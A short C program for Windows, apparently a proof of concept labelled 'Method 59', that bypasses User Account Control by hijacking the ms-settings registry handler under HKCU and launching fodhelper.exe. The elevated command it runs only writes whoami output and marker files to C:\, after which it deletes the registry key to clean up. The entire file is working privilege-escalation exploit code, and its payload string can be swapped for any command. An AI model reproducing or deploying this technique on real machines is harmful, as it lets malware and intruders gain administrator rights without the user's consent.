#include <windows.h>
#include <stdio.h>

int main() {
    const char* payload = "cmd.exe /c \"whoami > C:\\elevated_success.txt & echo UAC BYPASSED VIA METHOD 59 ON 25H2 > C:\\uac_bypassed.txt & timeout 5\"";

    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE*)payload, (DWORD)strlen(payload) + 1);
        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
        RegCloseKey(hKey);
    }

    ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_HIDE);

    Sleep(8000);

    RegDeleteKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command", KEY_ALL_ACCESS, 0);

    printf("[+] Method 59 executed. Check C:\\elevated_success.txt and C:\\uac_bypassed.txt\n");
    return 0;
}
